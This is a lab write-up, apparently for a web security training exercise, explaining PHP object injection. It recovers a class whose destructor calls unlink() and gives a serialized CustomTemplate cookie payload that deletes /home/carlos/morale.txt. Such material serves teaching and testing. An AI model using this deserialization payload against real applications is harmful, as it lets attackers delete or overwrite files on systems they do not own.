# Arbitrary object injection in PHP

 This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can log in to your own account using the following credentials: wiener:peter 

### solution

- start by logging in using **wiener:peter** creds but intercept this request

<img src=./images/Capture0.PNG alt="img0" width="700"/>

- we did that cuz we want to get the sitemap of the site
- from the sitemap we notice interesting file **CustomTemplate.php**

<img src=./images/Capture10.PNG alt="img10" width="700"/>

- try appending **tilda ~** to this file in the url.
- we got the source code

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

- from the source code we notice that their is a magic method **__destruct()**
- in this method we find **unlink()** method that will delete the file stored in **lock_file_path**
- back to the request we intercepted and note that the cookie has the value: `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJhdWZkeXVlb2ZocWt0b3c1dzVvd3UzcXhsZGZubmJ3bCI7fQ%3d%3d`
- decode it in cyberchef and u will get this: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"aufdyueofhqktow5w5owu3qxldfnnbwl";}`

<img src=./images/Capture11.PNG alt="img11" width="700"/>

- change it to `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}` then encode it and send the request again.
- congratzzzzzzzzzzzzzzzzzzzzzz